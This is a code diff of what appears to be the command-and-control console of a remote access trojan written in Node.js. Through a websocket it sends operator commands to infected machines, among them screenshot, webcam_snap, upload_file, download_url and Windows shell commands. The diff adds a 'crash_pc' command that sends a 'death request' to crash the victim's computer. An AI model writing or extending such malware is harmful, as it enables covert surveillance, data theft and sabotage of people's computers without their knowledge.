@@ -6,10 +6,11 @@ var workingDir = "";
 sessions = [];
 var filename = "";
 currentSession = 0;
+console.log("\n");
 console.log("      _                      _______                      _");
 console.log("   _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_");
 console.log("  dP'  ~YMMb            dOOOOOOA3OOOOOOOb            aMMP~  `Yb");
-console.log("  V      ~\"Mb          dOOOOOOA3OOOOOOOOOb          dM\"~      V");
+console.log("  V      ~\"Mb         dOOOOOOA3OOOOOOOOOb          dM\"~      V");
 console.log("           `Mb.       dOOOOOOOOA3OOOOOOOOOb       ,dM'");
 console.log("            `YMb._   |OOOOOOOOOA3OOOOOOOOOO|   _,dMP'");
 console.log("       __     `YMMM| OP'~\"YOOOOOOOOOOOP\"~`YO |MMMP'     __");
@@ -92,7 +93,7 @@ wss.on('connection', function connection(ws) {
 });
 
 function suggestions(line) {
-	const completions = 'win_help exit help speedtest list_users upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
+	const completions = 'win_help exit help speedtest list_users crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
 	const hits = completions.filter((c) => c.startsWith(line));
 	return [hits.length ? hits : completions, line];
 }
@@ -108,6 +109,19 @@ rl.on('line', (line) => {
 	} else if (msg.startsWith("upload_file")) {
 		console.log("[".bold + "+".blue + "] Uploading file (Please be patient)...".bold);
 		sessions[currentSession].send(msg);
+	} else if (msg.startsWith("crash_pc")) {
+		if(msg.split(" ").length != 2){
+			console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "crash_pc <times (int)>");
+			rl.prompt();
+		}else{
+			if(!isNaN(msg.split(" ")[1]) && parseInt(Number(msg.split(" ")[1])) == msg.split(" ")[1] && !isNaN(parseInt(msg.split(" ")[1], 10))){
+				console.log("[".bold + "+".blue + "] Sent death request !".bold);
+				sessions[currentSession].send(msg);
+			}else{
+				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Argument : " + "<times>".bold + " needs to be an integer.");
+				rl.prompt();
+			}
+		}
 	} else if (msg.startsWith("download_url")) {
 		if (msg.split(" ").length == 4) {
 			var string = msg.split(" ");
@@ -122,7 +136,7 @@ rl.on('line', (line) => {
 				rl.prompt();
 			}
 		}else{
-			console.log("[".white + "-".red + "]".white + " Too few arguments : ".red + "download_url <url> <filename> <path>");
+			console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "download_url <url> <filename> <path>");
 		}
 	}else if(msg == "webcam_snap"){
 		console.log("[".bold + "+".blue + "] Capturing and uploading picture (May exceed 10MO, please be patient)...".bold);
